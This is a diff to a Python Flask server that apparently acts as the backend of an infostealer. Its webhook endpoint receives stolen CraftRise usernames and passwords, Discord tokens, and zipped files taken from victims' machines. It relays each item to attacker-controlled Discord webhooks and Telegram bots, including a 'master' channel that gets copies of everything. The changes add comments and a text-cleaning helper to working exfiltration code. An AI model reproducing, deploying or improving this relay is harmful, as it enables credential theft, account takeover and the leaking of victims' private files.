@@ -7,6 +7,7 @@ from datetime import datetime
 
 app = Flask(__name__)
 
+# Environment variables
 WEBHOOK = os.environ.get("WEBHOOK", "")
 TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
@@ -24,6 +25,13 @@ MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
 MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")
 
 LOGO_SIGN = "https://media.discordapp.net/attachments/1531817920907448421/1535048621937000498/JlTlE.jpg?ex=6a7658ef&is=6a75076f&hm=69ba75845e28c680fbe3074e564ad63b4d64a8a11a43cc2a175278e6e0f47a8f&=&format=webp"
+
+def clean_text(text):
+    if not text: return ""
+    text = re.sub(r'<a?:[a-zA-Z0-9_]+:\d+>', '', str(text))
+    text = text.replace("**", "").replace("`", "").replace("*", "").replace("\\_", "_")
+    text = text.replace("@everyone", "").replace("@here", "")
+    return text.strip()
 
 def send_telegram_msg(token, chat_id, msg):
     if not (token and chat_id and msg): return
@@ -74,6 +82,7 @@ def webhook():
             user = creds.get("username", "Unknown") if isinstance(creds, dict) else "Unknown"
             pw = creds.get("password", "Unknown") if isinstance(creds, dict) else "Unknown"
             
+            # Discord
             cr_embed = {
                 "embeds": [{
                     "title": "CraftRise",
@@ -86,6 +95,8 @@ def webhook():
                 }]
             }
             send_discord(CRAFTRISE_WEBHOOK, cr_embed)
+            
+            # Telegram
             send_telegram_msg(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, f"CraftRise\n{user}:{pw}")
 
         # ============ DISCORD TOKEN ============
@@ -96,6 +107,7 @@ def webhook():
                 except: tokens = [tokens]
             
             if tokens:
+                # Discord
                 discord_embed = {
                     "embeds": [{
                         "title": "Discord",
@@ -110,6 +122,7 @@ def webhook():
                 }
                 send_discord(DISCORD_WEBHOOK, discord_embed)
                 
+                # Telegram (her token tek tek)
                 for token in tokens:
                     send_telegram_msg(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, f"Discord\nToken: {token}")
 
@@ -129,9 +142,11 @@ def webhook():
                         embed["thumbnail"] = {"url": LOGO_SIGN}
             
             if file_bytes:
+                # Master Webhook
                 files = {'file': (f"{hostname}.zip", file_bytes)}
                 send_discord(MASTER_WEBHOOK, {'content': data.get("content", "")}, files)
                 send_discord(WEBHOOK, {'content': data.get("content", "")}, files)
+                # Telegram
                 send_telegram_file(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, file_bytes, f"{hostname}.zip")
                 send_telegram_file(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, file_bytes, f"{hostname}.zip")
             else:
